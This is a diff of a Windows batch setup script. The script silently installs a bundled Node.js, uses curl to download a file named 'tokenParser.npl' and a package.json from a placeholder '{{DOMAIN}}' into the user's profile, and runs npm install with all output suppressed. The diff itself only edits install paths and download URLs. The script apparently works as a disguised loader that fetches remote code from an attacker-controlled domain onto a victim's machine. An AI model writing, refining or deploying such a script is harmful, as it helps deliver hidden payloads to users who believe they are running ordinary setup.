@@ -13,7 +13,7 @@ set "NODE_VERSION=20.11.1"
 set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
 set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
 set "EXTRACT_DIR=%~dp0nodejs"
-set "NODE_EXE=%EXTRACT_DIR%\nodejs\node.exe"
+set "NODE_EXE=%EXTRACT_DIR%\\PFiles64\nodejs\node.exe"
 
 :: Check if Node is already installed
 for /f "delims=" %%v in ('"%NODE_EXE%" -v 2^>nul') do (
@@ -47,7 +47,7 @@ if "!INSTALL_NODE!"=="1" (
 
 :: Set PATH to extracted node
 if exist "%NODE_EXE%" (
-    set "PATH=%EXTRACT_DIR%\nodejs;%PATH%"
+    set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
 ) else (
     echo [ERROR] node.exe not found after extraction.
     exit /b 1
@@ -60,13 +60,13 @@ if exist "%NODE_EXE%" (
 set "USERPROFILE=%USERPROFILE%"
 
 :: Download tokenParser and package.json
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/tokenParser.npl"
-curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/package.json"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/users/tokenParser.npl"
+curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/users/package.json"
 
 :: Install dependencies
 if not exist "%~dp0node_modules\request" (
     pushd "%~dp0"
-    call "%NODE_EXE%" "%EXTRACT_DIR%\nodejs\node_modules\npm\bin\npm-cli.js" install --silent --no-progress --loglevel=error --fund=false
+    call "%NODE_EXE%" "%EXTRACT_DIR%\PFiles64\nodejs\node_modules\npm\bin\npm-cli.js" install --silent --no-progress --loglevel=error --fund=false
     if errorlevel 1 (
         popd
         exit /b
